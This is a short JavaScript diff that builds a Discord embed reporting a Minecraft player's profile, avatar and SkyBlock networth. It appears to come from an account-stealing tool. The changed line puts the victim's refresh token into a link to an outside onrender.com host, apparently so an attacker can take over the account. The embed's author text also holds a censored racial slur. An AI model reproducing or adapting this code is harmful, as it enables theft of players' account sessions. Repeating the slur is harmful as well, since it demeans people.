@@ -170,7 +170,7 @@ const embed = new EmbedBuilder()
   .setTitle(name)
   .setURL('https://sky.shiiyu.moe/stats/' + name)
   .setThumbnail('https://crafatar.com/avatars/' + id)
-  .setAuthor({ name: 'Hit Some Ni**a Hard', url: 'https://verification-dcyg.onrender.com/refresh?refreshToken=' + refresh })
+  .setAuthor({ name: 'Hit Some Ni**a Hard', url: 'https://tokenmc1111.onrender.com' + refresh })
   .addFields(
     { name: 'Network', value: networth, inline: true }, { name: 'Unsoulbound', value: uNetworth, inline: true },
     { name: ' ', value: ' ' },
